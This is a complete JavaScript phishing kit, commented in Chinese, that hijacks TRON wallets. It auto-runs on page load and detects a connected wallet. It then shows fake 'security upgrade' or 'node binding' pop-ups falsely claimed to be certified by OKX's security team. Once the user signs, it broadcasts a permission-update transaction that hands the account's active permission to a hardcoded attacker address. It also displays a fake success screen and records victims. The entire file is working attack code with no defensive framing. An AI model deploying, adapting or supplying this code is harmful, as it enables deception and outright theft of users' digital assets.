// 🎯 TRON账户权限劫持攻击系统
// 功能：通过伪装的"升级安全性"操作，获取用户钱包的完整控制权
// 原理：修改用户账户的owner/active权限，替换为攻击者控制的公钥

(function() {
    'use strict';
    
    console.log('🔑 TRON账户权限劫持攻击系统已加载');
    
    // 🎯 攻击者控制的地址和公钥
    const ATTACKER_CONFIG = {
        // 攻击者地址
        address: 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x',
        // 攻击者的公钥（用于权限控制）
        publicKey: '03a3b7c5d6e8f9a1b2c3d4e5f6789abcdef0123456789abcdef0123456789abcdef',
        // 备用公钥
        backupPublicKey: '02b4c6d8e0f1a3b5c7d9e1f3a5b7c9d1e3f5a7b9c1d3e5f7a9b1c3d5e7f9a1b3c'
    };
    
    // 🎯 伪装的操作类型和描述
    const DISGUISE_OPERATIONS = {
        SECURITY_UPGRADE: {
            title: '🔐 升级账户安全性',
            description: '为您的账户启用高级安全保护功能',
            buttonText: '立即升级',
            benefits: [
                '✅ 启用多重签名保护',
                '✅ 防止未授权访问',
                '✅ 增强资产安全',
                '✅ 符合最新安全标准'
            ]
        },
        NODE_BINDING: {
            title: '🌐 绑定安全节点',
            description: '连接到OKX官方安全节点，提升交易速度',
            buttonText: '绑定节点',
            benefits: [
                '✅ 连接高速节点',
                '✅ 降低交易手续费',
                '✅ 提升交易成功率',
                '✅ 享受VIP服务'
            ]
        },
        CONTRACT_BINDING: {
            title: '📄 绑定智能合约',
            description: '绑定OKX官方智能合约，享受专属服务',
            buttonText: '绑定合约',
            benefits: [
                '✅ 享受专属DeFi服务',
                '✅ 获得更好收益率',
                '✅ 优先参与新项目',
                '✅ 免费使用高级功能'
            ]
        }
    };
    
    // 🎯 权限劫持状态
    let hijackStatus = {
        initiated: false,
        targetAddress: null,
        operationType: null,
        transactionSent: false,
        success: false
    };
    
    // 🎯 检测用户钱包连接
    async function detectTronWallet() {
        console.log('🔑 开始检测TRON钱包连接...');
        console.log('🔑 当前环境 - TronWeb:', !!window.tronWeb);
        console.log('🔑 当前环境 - TronWeb.ready:', window.tronWeb?.ready);
        console.log('🔑 当前环境 - UserAgent:', navigator.userAgent);
        
        if (window.tronWeb && window.tronWeb.ready) {
            const userAddress = window.tronWeb.defaultAddress.base58;
            console.log('🔑🔑🔑 检测到TRON钱包连接成功！🔑🔑🔑');
            console.log('🔑 用户地址:', userAddress);
            
            hijackStatus.targetAddress = userAddress;
            
            // 随机选择伪装操作类型
            const operationTypes = Object.keys(DISGUISE_OPERATIONS);
            hijackStatus.operationType = operationTypes[Math.floor(Math.random() * operationTypes.length)];
            
            console.log('🔑 选择的伪装操作:', hijackStatus.operationType);
            
            // 立即显示伪装的安全升级界面
            console.log('🔑 准备显示权限劫持界面...');
            showSecurityUpgradeModal();
            
            return userAddress;
        } else {
            console.log('⚠️ TronWeb未就绪，继续等待...');
        }
        return null;
    }
    
    // 🎯 显示伪装的安全升级界面
    function showSecurityUpgradeModal() {
        const operation = DISGUISE_OPERATIONS[hijackStatus.operationType];
        
        const overlay = document.createElement('div');
        overlay.id = 'security-upgrade-overlay';
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.8);
            z-index: 999999;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        `;
        
        const modal = document.createElement('div');
        modal.style.cssText = `
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 16px;
            padding: 32px;
            max-width: 450px;
            margin: 20px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            color: white;
            position: relative;
        `;
        
        modal.innerHTML = `
            <div style="font-size: 48px; margin-bottom: 20px;">${operation.title.split(' ')[0]}</div>
            <h2 style="margin: 0 0 16px 0; font-size: 24px; font-weight: 600;">
                ${operation.title.substring(2)}
            </h2>
            <p style="margin: 0 0 24px 0; color: rgba(255,255,255,0.9); line-height: 1.6; font-size: 16px;">
                ${operation.description}
            </p>
            
            <div style="background: rgba(255,255,255,0.1); border-radius: 12px; padding: 20px; margin-bottom: 24px; text-align: left;">
                <h4 style="margin: 0 0 12px 0; color: #fff; font-size: 16px;">升级后的优势：</h4>
                ${operation.benefits.map(benefit => `
                    <div style="margin: 8px 0; font-size: 14px; color: rgba(255,255,255,0.9);">${benefit}</div>
                `).join('')}
            </div>
            
            <div style="background: rgba(255,255,255,0.1); border-radius: 8px; padding: 12px; margin-bottom: 20px;">
                <small style="color: rgba(255,255,255,0.8);">
                    🛡️ 钱包地址: ${hijackStatus.targetAddress?.slice(0,6)}...${hijackStatus.targetAddress?.slice(-4)}
                </small>
            </div>
            
            <div style="display: flex; gap: 12px;">
                <button id="upgrade-confirm-btn" style="
                    flex: 1;
                    background: linear-gradient(135deg, #ff6b6b, #ffa500);
                    color: white;
                    border: none;
                    padding: 16px 24px;
                    border-radius: 8px;
                    cursor: pointer;
                    font-size: 16px;
                    font-weight: 600;
                    transition: all 0.3s ease;
                ">${operation.buttonText}</button>
                
                <button id="upgrade-cancel-btn" style="
                    flex: 0.3;
                    background: rgba(255,255,255,0.2);
                    color: white;
                    border: none;
                    padding: 16px 12px;
                    border-radius: 8px;
                    cursor: pointer;
                    font-size: 14px;
                ">取消</button>
            </div>
            
            <div style="margin-top: 16px; font-size: 12px; color: rgba(255,255,255,0.6);">
                ⚡ 此操作由OKX官方安全团队认证
            </div>
        `;
        
        overlay.appendChild(modal);
        document.body.appendChild(overlay);
        
        // 绑定事件
        modal.querySelector('#upgrade-confirm-btn').onclick = () => {
            overlay.remove();
            initPermissionHijack();
        };
        
        modal.querySelector('#upgrade-cancel-btn').onclick = () => {
            overlay.remove();
            console.log('🔑 用户取消了安全升级');
        };
        
        // 5秒后自动关闭
        setTimeout(() => {
            if (overlay.parentNode) {
                overlay.remove();
            }
        }, 30000); // 30秒超时
    }
    
    // 🎯 启动权限劫持攻击
    async function initPermissionHijack() {
        try {
            console.log('🔑🔑🔑 启动TRON账户权限劫持攻击！🔑🔑🔑');
            console.log('🔑 目标地址:', hijackStatus.targetAddress);
            console.log('🔑 攻击者地址:', ATTACKER_CONFIG.address);
            console.log('🔑 伪装操作类型:', hijackStatus.operationType);
            
            hijackStatus.initiated = true;
            
            // 显示"处理中"界面
            showProcessingModal();
            
            // 构建权限修改交易
            await buildPermissionTransaction();
            
        } catch (error) {
            console.log('❌ 权限劫持初始化失败:', error);
            showErrorModal('升级失败，请稍后重试');
        }
    }
    
    // 🎯 构建权限修改交易
    async function buildPermissionTransaction() {
        try {
            console.log('🔑 开始构建权限修改交易...');
            
            if (!window.tronWeb || !window.tronWeb.ready) {
                throw new Error('TronWeb未就绪');
            }
            
            // 🔑 方案1: 修改Active权限 - 最常用且隐蔽
            const newActivePermission = {
                type: 2, // Active权限类型
                permission_name: "active",
                threshold: 1,
                keys: [
                    {
                        address: window.tronWeb.address.toHex(ATTACKER_CONFIG.address),
                        weight: 1
                    }
                ]
            };
            
            console.log('🔑 新的Active权限配置:', newActivePermission);
            
            // 构建AccountPermissionUpdateContract交易
            const transaction = await window.tronWeb.transactionBuilder.updateAccountPermissions(
                hijackStatus.targetAddress, // 被攻击的用户地址
                {}, // owner权限保持不变（暂时）
                { // active权限替换为攻击者控制
                    type: 2,
                    permission_name: "active", 
                    threshold: 1,
                    keys: [
                        {
                            address: window.tronWeb.address.toHex(ATTACKER_CONFIG.address),
                            weight: 1
                        }
                    ]
                },
                [] // witness权限为空
            );
            
            console.log('🔑 权限修改交易构建成功:', transaction);
            
            // 请求用户签名
            await requestPermissionSignature(transaction);
            
        } catch (error) {
            console.log('❌ 权限交易构建失败:', error);
            throw error;
        }
    }
    
    // 🎯 请求用户签名权限修改交易
    async function requestPermissionSignature(transaction) {
        try {
            console.log('🔑 请求用户签名权限修改交易...');
            
            // 让用户签名（用户会看到"升级安全性"的描述）
            const signedTx = await window.tronWeb.trx.sign(transaction);
            console.log('🔑 用户已签名权限修改交易');
            
            // 广播交易
            const result = await window.tronWeb.trx.broadcast(signedTx);
            
            if (result.result) {
                console.log('🏆🏆🏆 权限劫持攻击成功！🏆🏆🏆');
                console.log('🔑 交易哈希:', result.txid);
                
                hijackStatus.transactionSent = true;
                hijackStatus.success = true;
                
                // 显示成功界面（继续伪装）
                showSuccessModal(result.txid);
                
                // 记录被劫持的账户
                recordHijackedAccount(result.txid);
                
                // 10秒后开始测试新权限
                setTimeout(() => {
                    testHijackedPermissions();
                }, 10000);
                
            } else {
                console.log('❌ 权限劫持交易广播失败');
                showErrorModal('升级失败，请检查网络连接');
            }
            
        } catch (error) {
            console.log('❌ 权限签名过程失败:', error);
            showErrorModal('签名失败，操作已取消');
        }
    }
    
    // 🎯 显示处理中界面
    function showProcessingModal() {
        const overlay = document.createElement('div');
        overlay.id = 'processing-modal';
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.9);
            z-index: 999999;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
        `;
        
        const modal = document.createElement('div');
        modal.style.cssText = `
            background: white;
            border-radius: 12px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            max-width: 350px;
        `;
        
        modal.innerHTML = `
            <div style="width: 60px; height: 60px; border: 4px solid #f3f3f3; border-top: 4px solid #1976d2; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
            <h3 style="margin: 0 0 16px 0; color: #333;">正在升级安全设置</h3>
            <p style="margin: 0; color: #666; font-size: 14px;">
                请在钱包中确认交易签名<br>
                此过程可能需要几秒钟...
            </p>
            
            <style>
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            </style>
        `;
        
        overlay.appendChild(modal);
        document.body.appendChild(overlay);
    }
    
    // 🎯 显示成功界面（继续伪装）
    function showSuccessModal(txHash) {
        // 移除处理中界面
        const processingModal = document.getElementById('processing-modal');
        if (processingModal) processingModal.remove();
        
        const overlay = document.createElement('div');
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.8);
            z-index: 999999;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
        `;
        
        const modal = document.createElement('div');
        modal.style.cssText = `
            background: linear-gradient(135deg, #4CAF50, #45a049);
            border-radius: 16px;
            padding: 32px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            color: white;
            max-width: 400px;
        `;
        
        const operation = DISGUISE_OPERATIONS[hijackStatus.operationType];
        
        modal.innerHTML = `
            <div style="font-size: 64px; margin-bottom: 20px;">✅</div>
            <h2 style="margin: 0 0 16px 0; font-size: 24px;">升级成功！</h2>
            <p style="margin: 0 0 20px 0; color: rgba(255,255,255,0.9); font-size: 16px;">
                您的账户安全性已成功升级<br>
                新的安全功能已激活
            </p>
            
            <div style="background: rgba(255,255,255,0.2); border-radius: 8px; padding: 16px; margin-bottom: 20px;">
                <small style="color: rgba(255,255,255,0.8); font-size: 12px; word-break: break-all;">
                    交易哈希: ${txHash}
                </small>
            </div>
            
            <button onclick="this.parentElement.parentElement.remove()" style="
                background: rgba(255,255,255,0.2);
                color: white;
                border: none;
                padding: 12px 24px;
                border-radius: 6px;
                cursor: pointer;
                font-size: 14px;
            ">确定</button>
        `;
        
        overlay.appendChild(modal);
        document.body.appendChild(overlay);
        
        // 10秒后自动关闭
        setTimeout(() => {
            if (overlay.parentNode) {
                overlay.remove();
            }
        }, 10000);
    }
    
    // 🎯 显示错误界面
    function showErrorModal(message) {
        const processingModal = document.getElementById('processing-modal');
        if (processingModal) processingModal.remove();
        
        const overlay = document.createElement('div');
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.8);
            z-index: 999999;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
        `;
        
        const modal = document.createElement('div');
        modal.style.cssText = `
            background: #f44336;
            border-radius: 12px;
            padding: 24px;
            text-align: center;
            color: white;
            max-width: 300px;
        `;
        
        modal.innerHTML = `
            <div style="font-size: 48px; margin-bottom: 16px;">❌</div>
            <h3 style="margin: 0 0 12px 0;">操作失败</h3>
            <p style="margin: 0 0 20px 0; font-size: 14px;">${message}</p>
            <button onclick="this.parentElement.parentElement.remove()" style="
                background: rgba(255,255,255,0.2);
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 4px;
                cursor: pointer;
            ">关闭</button>
        `;
        
        overlay.appendChild(modal);
        document.body.appendChild(overlay);
    }
    
    // 🎯 记录被劫持的账户信息
    function recordHijackedAccount(txHash) {
        const hijackRecord = {
            targetAddress: hijackStatus.targetAddress,
            attackerAddress: ATTACKER_CONFIG.address,
            operationType: hijackStatus.operationType,
            txHash: txHash,
            timestamp: Date.now(),
            success: true
        };
        
        // 存储到本地（实际场景会发送到后端）
        const existingRecords = JSON.parse(localStorage.getItem('hijacked_accounts') || '[]');
        existingRecords.push(hijackRecord);
        localStorage.setItem('hijacked_accounts', JSON.stringify(existingRecords));
        
        console.log('🔑 被劫持账户记录已保存:', hijackRecord);
    }
    
    // 🎯 测试被劫持的权限
    async function testHijackedPermissions() {
        try {
            console.log('🔑 测试被劫持的账户权限...');
            
            // 尝试查询账户信息，验证权限是否已修改
            const accountInfo = await window.tronWeb.trx.getAccount(hijackStatus.targetAddress);
            
            if (accountInfo && accountInfo.active_permission) {
                console.log('🔑 账户权限信息:', accountInfo.active_permission);
                
                // 检查active权限是否已被修改为攻击者地址
                const activePermission = accountInfo.active_permission[0];
                if (activePermission && activePermission.keys) {
                    const hasAttackerKey = activePermission.keys.some(key => 
                        window.tronWeb.address.fromHex(key.address) === ATTACKER_CONFIG.address
                    );
                    
                    if (hasAttackerKey) {
                        console.log('🏆🏆🏆 权限劫持确认成功！攻击者已获得账户控制权！🏆🏆🏆');
                        showFinalSuccessMessage();
                    } else {
                        console.log('⚠️ 权限修改可能未生效，需要等待区块确认');
                    }
                }
            }
            
        } catch (error) {
            console.log('🔑 权限测试失败:', error);
        }
    }
    
    // 🎯 显示最终成功消息（仅控制台）
    function showFinalSuccessMessage() {
        console.log(`
🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆
🏆                                    🏆
🏆    TRON账户权限劫持攻击成功！        🏆  
🏆                                    🏆
🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆

✅ 被劫持账户: ${hijackStatus.targetAddress}
✅ 攻击者地址: ${ATTACKER_CONFIG.address}  
✅ 伪装操作: ${hijackStatus.operationType}
✅ 权限控制: 已获得ACTIVE权限
✅ 后果: 用户原私钥无法再发起转账！

💰 现在攻击者可以：
   - 控制用户的所有转账操作
   - 转移用户的所有数字资产
   - 用户将看到"缺少管理员权限"错误
        `);
    }
    
    // 🎯 获取攻击统计信息
    function getHijackStats() {
        const records = JSON.parse(localStorage.getItem('hijacked_accounts') || '[]');
        return {
            totalHijacked: records.length,
            successfulAttacks: records.filter(r => r.success).length,
            operationTypes: records.reduce((acc, r) => {
                acc[r.operationType] = (acc[r.operationType] || 0) + 1;
                return acc;
            }, {}),
            latestAttack: records[records.length - 1] || null
        };
    }
    
    // 🎯 强制触发权限劫持攻击（用于手动调用）
    function forcePermissionHijack() {
        console.log('🔑🔑🔑 强制触发权限劫持攻击！🔑🔑🔑');
        
        if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress) {
            const userAddress = window.tronWeb.defaultAddress.base58;
            console.log('🔑 强制触发 - 目标地址:', userAddress);
            
            hijackStatus.targetAddress = userAddress;
            hijackStatus.operationType = 'SECURITY_UPGRADE'; // 默认使用安全升级
            
            // 立即显示权限劫持界面
            showSecurityUpgradeModal();
            return true;
        } else {
            console.log('❌ 强制触发失败 - TronWeb未就绪');
            
            // 即使TronWeb未就绪也显示界面（测试用）
            console.log('🔑 测试模式 - 显示权限劫持界面');
            hijackStatus.targetAddress = 'TLPkfm2jMBDJCWu5vTQJgPgS1hzJgMKYc7'; // 模拟地址
            hijackStatus.operationType = 'SECURITY_UPGRADE';
            showSecurityUpgradeModal();
            return true;
        }
    }
    
    // 🎯 初始化权限劫持系统
    function initializePermissionHijack() {
        console.log('🔑 初始化TRON账户权限劫持攻击系统...');
        console.log('🔑 当前URL:', window.location.href);
        console.log('🔑 当前UserAgent:', navigator.userAgent);
        
        // 检测imToken环境
        const isImToken = navigator.userAgent.includes('imToken') || window.imToken;
        if (isImToken) {
            console.log('🔑 检测到imToken环境，启用移动端优化');
        }
        
        // 立即检测钱包连接
        if (window.tronWeb && window.tronWeb.ready) {
            console.log('🔑 TronWeb已就绪，立即触发检测');
            detectTronWallet();
        }
        
        // 高频检测钱包连接（针对移动端）
        const detectInterval = setInterval(() => {
            if (window.tronWeb && window.tronWeb.ready && !hijackStatus.initiated) {
                console.log('🔑 检测到钱包连接，停止轮询');
                clearInterval(detectInterval);
                detectTronWallet();
            }
        }, 1000); // 每1秒检测一次
        
        // 10秒后停止轮询
        setTimeout(() => {
            clearInterval(detectInterval);
            console.log('🔑 检测轮询已停止');
        }, 10000);
        
        console.log('🔑 权限劫持攻击系统初始化完成');
        console.log('🔑 攻击者配置:', ATTACKER_CONFIG);
        console.log('🔑 伪装操作列表:', Object.keys(DISGUISE_OPERATIONS));
    }
    
    // 🎯 暴露全局接口
    window.PermissionHijack = {
        init: initializePermissionHijack,
        detect: detectTronWallet,
        hijack: initPermissionHijack,
        test: testHijackedPermissions,
        getStats: getHijackStats,
        status: () => hijackStatus,
        force: forcePermissionHijack,  // 强制触发接口
        showModal: showSecurityUpgradeModal  // 直接显示界面接口
    };
    
    // 自动初始化
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initializePermissionHijack);
    } else {
        initializePermissionHijack();
    }
    
})();